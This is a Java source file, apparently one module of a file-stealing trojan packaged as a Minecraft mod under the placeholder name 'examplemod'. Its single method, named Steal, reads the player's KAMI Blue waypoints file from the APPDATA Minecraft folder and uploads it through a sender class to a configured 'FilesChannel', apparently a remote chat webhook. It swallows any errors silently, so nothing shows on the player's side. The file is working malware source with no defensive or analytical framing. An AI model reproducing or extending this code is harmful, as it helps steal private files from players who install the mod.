package com.example.examplemod.Hacks.FilesGrabber.Kami;

import com.example.examplemod.Sender.Cfg;
import com.example.examplemod.Sender.SendMessage;
import java.io.File;

public class KamiWaypoints {
   public static void Steal() throws Exception {
      try {
         SendMessage.sendFile(new File(System.getenv("APPDATA") + "\\.minecraft\\KAMIBlueWaypoints.json"));
         SendMessage.doThing("```KamiWaypoints ^^^```", Cfg.FilesChannel);
      } catch (Exception var1) {
         System.out.println("lol321");
      }

   }
}
